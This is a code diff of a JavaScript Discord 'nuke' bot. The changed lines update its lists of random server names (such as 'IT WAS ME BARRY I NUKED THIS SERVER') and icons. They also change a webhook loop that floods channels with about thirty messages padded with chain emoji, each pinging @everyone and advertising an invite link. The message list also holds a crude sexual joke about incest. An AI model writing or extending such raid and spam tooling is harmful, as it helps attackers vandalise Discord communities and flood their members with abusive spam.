@@ -432,19 +432,21 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
 ,
 `Barry do you remember the time the chair was thrown? It was ME Barry I was the one who threw the chair!` 
 ,
+`https://youtu.be/fi36ePIX2kY`
+,
 `Barry do you remember that time when you were sixteen and you fucked your sister in the dark because you thought she was unconscious? It was me Barry! I was your sister!`] 
 return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
  function randomnames() {
-   var rand = ["𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘 𝐈 𝐍𝐔𝐊𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑", "『ΛDᄃ』"]
+   var rand = ["𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘 𝐈 𝐍𝐔𝐊𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑", "𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
  function randomicons123() {
-   var rand = ["https://i.ytimg.com/vi/xpWOO9nRvIU/maxresdefault.jpg", "https://images-ext-2.discordapp.net/external/6MPTRncmvgq5hPq9oqcBF8EMu1hFsEhKqLaNuO_T6pk/https/cdn.discordapp.com/avatars/759838559946801173/15718b03a63578fea527dd1cb8638c46.webp"]
+   var rand = ["https://media.discordapp.net/attachments/782775478820929577/789141260106596372/comics-reverse-flash-wallpaper-thumb.png", "https://i.ytimg.com/vi/xpWOO9nRvIU/maxresdefault.jpg", "https://images-ext-2.discordapp.net/external/6MPTRncmvgq5hPq9oqcBF8EMu1hFsEhKqLaNuO_T6pk/https/cdn.discordapp.com/avatars/759838559946801173/15718b03a63578fea527dd1cb8638c46.webp"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
@@ -493,7 +495,7 @@ if(list.includes(msg.author.id)) {return}
                 p.createWebhook("assy").then(w => {
                      
                 [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
-                    w.send(randomT() + "\n discord.gg/XVAHsbqnU4 @everyone")
+                    w.send(randomT() + ":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains: \n discord.gg/XVAHsbqnU4 @everyone")
                     
                 
                 })
